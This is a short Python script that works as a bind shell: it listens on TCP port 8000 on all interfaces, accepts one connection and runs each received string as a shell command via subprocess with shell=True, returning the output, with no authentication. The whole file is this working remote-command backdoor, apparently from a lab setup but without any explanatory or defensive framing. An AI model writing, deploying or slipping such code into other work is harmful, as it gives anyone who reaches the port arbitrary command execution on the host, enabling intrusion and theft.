import socket
import subprocess

# HOST = "192.168.64.5"
HOST = ''
PORT = 8000

# --- Main Logic ---
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    s.bind((HOST, PORT))
    s.listen(1)
    conn, addr = s.accept()
    while True:
        command = conn.recv(1024).decode()

        if command.lower() in ["exit", "quit"]:
            break
            
        op = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        output, _ = op.communicate()

        if not output:
            output = b"Command executed, but no output/an error was returned."

        conn.send(output)

finally:
    s.close()
